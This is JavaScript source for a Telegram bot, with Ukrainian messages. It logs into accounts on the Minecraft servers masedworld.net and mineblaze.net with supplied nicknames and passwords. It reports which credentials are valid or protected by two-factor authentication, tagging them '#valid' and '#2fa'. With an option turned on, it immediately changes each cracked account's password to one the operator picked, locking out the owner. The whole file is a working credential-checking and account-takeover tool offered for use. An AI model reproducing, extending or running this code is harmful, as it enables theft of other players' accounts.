const mineflayer = require('mineflayer');
const TelegramBot = require('node-telegram-bot-api');
const fs = require("fs")


const TELEGRAM_TOKEN = 'Тут замініть на свій токен узятий з @botfather';
const settings = JSON.parse(fs.readFileSync('config.json', 'utf-8'))
let standartpass = settings.standartpass;
let autochangepass = settings.autochangepass

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

bot.onText("/start", (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `Привіт!, bot created by xidlys\n/help`);
});

bot.onText(/\/autocpass (.+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  standartpass = match[1];
  const onof = match[2].toLowerCase();
  if (onof == "on" || onof == "true") {
    autochangepass = true;
    bot.sendMessage(chatId, `Авто зміна пароля на "${standartpass}" увімкнена`);
    settings.autochangepass = autochangepass
  } else if (onof === "off" || onof === "of" || onof == false) {
    autochangepass = false;
    settings.autochangepass = autochangepass
    bot.sendMessage(chatId, `Авто Зміна пароля вимкнена`);
  }
  settings.standartpass = standartpass
  fs.writeFileSync("config.json", JSON.stringify(settings, null, 2))
});

bot.onText("/help", (msg) => {
  const chatId = msg.chat.id
  bot.sendMessage(chatId, `/help - Допомога\n/autocpass пароль on/off\n/mw nick passord\n/mb nick password\n/settings`);
})
bot.onText("/settings", (msg) => {
  const chatId = msg.chat.id
  bot.sendMessage(chatId, `Автозміна пароля: ${autochangepass};\nПароль для автозміни: ${standartpass}\n\n\n\n\n<b>Для встановлення пароля на автозміну використовуйте команду /autocpass пароль on/off, </b>`)
})


bot.onText(/\/mw (.+) (.+)/, async(msg, match) => {
  const chatId = msg.chat.id
  const username = match[1]
  const password = match[2]
  bot.sendMessage(chatId, `Роблю спробу зайти на masedworld під нікнеймом ${username}...`)
  const mcBot = mineflayer.createBot({
      host: 'masedworld.net',
      username: username,
  });
  mcBot.on('login', () => {
    bot.sendMessage(chatId, `Успішно зайшов до аккаунту, виконую: /login ${password}`)
    mcBot.chat(`/login ${password}`);
  })
  mcBot.on('message', (jsonMsg) => {
      const message = jsonMsg.toString();
      console.log(`[Сервер]: ${message}`);

      if (message.includes('успешно')) {
          bot.sendMessage(chatId, `Успішний логін!:\nнікнейм: ${username},\nпароль: ${password}\n\n#valid`);
          if(autochangepass) {
            mcBot.chat(`/cp ${password} ${standartpass}`)
            bot.sendMessage(chatId, `У вас увімкнена автозміна пароля, новий пароль від ${username} це ${standartpass}`)
            mcBot.quit()
          }else mcBot.quit();
      } else if (message.includes('неверно') || message.includes('ошибка')) {
          bot.sendMessage(chatId, `Помилка заходу для ${username}, пароль невірний.`);
          mcBot.quit();
      } else if (message.includes('зарегистрироваться')) {
        bot.sendMessage(chatId, `Аккаунт навіть не зареєстрований`)
        mcBot.quit()
      } else if (message.includes('привязанных' || message.includes('подтвердите'))) {
        bot.sendMessage(chatId, `На аккаунті є 2х-фа безпека\n\n#2fa`)
        mcBot.quit()
      } else if(message.includes('авторизовались')) {
        bot.sendMessage(chatId, `Вже в аккаунті`)
        mcBot.chat('/logout'); mcBot.chat('/logout')
        mcBot.quit()
      }
  });
  mcBot.on('end', () => {
    bot.sendMessage(chatId, `З'єднання зі серверов розірвано для ${username}`)
  });

  mcBot.on('error', (err) => {
      console.error(err);
      bot.sendMessage(chatId, `Помилка: ${err.message}`);
      mcBot.quit();
  });
})

bot.onText(/\/mb (.+) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const username = match[1];
    const password = match[2];
    bot.sendMessage(chatId, `Роблю спробу зайти на mineblaze ${username}...`);

    const mcBot = mineflayer.createBot({
        host: 'mineblaze.net',
        username: username,
    });

    mcBot.on('login', () => {
        bot.sendMessage(chatId, `Успішно зайшов на аккаунт, виконую: /login ${password}`)
        mcBot.chat(`/login ${password}`);
    });

    mcBot.on('message', (jsonMsg) => {
        const message = jsonMsg.toString();
        console.log(`[Сервер]: ${message}`);

        if (message.includes('успешно')) {
            bot.sendMessage(chatId, `Успішний логін!:\nнікнейм: ${username},\nпароль: ${password}\n\n#valid`);
            if(autochangepass) {
              mcBot.chat(`/cp ${password} ${standartpass}`)
              bot.sendMessage(chatId, `У вас увімкнена автозміна пароля, новий пароль від ${username} це ${standartpass}`)
              mcBot.quit()
            }else mcBot.quit();
        } else if (message.includes('неверно') || message.includes('ошибка')) {
            bot.sendMessage(chatId, `Помилка заходу для ${username}, пароль невірний.`);
            mcBot.quit();
        } else if (message.includes('зарегистрироваться')) {
          bot.sendMessage(chatId, `Аккаунт навіть не зареєстрований`)
          mcBot.quit()
        } else if (message.includes('привязанных' || message.includes('подтвердите'))) {
          bot.sendMessage(chatId, `На аккаунті є 2х-фа безпека\n\n#2fa`)
          mcBot.quit()
        } else if(message.includes('авторизовались')) {
          bot.sendMessage(chatId, `Вже в аккаунті`)
          mcBot.chat('/logout'); mcBot.chat('/logout')
          mcBot.quit()
        }
    });

    mcBot.on('end', () => {
      bot.sendMessage(chatId, `З'єднання зі сервером розірвано для ${username}`)
    });

    mcBot.on('error', (err) => {
        console.error(err);
        bot.sendMessage(chatId, `Помилка: ${err.message}`);
        mcBot.quit();
    });
});
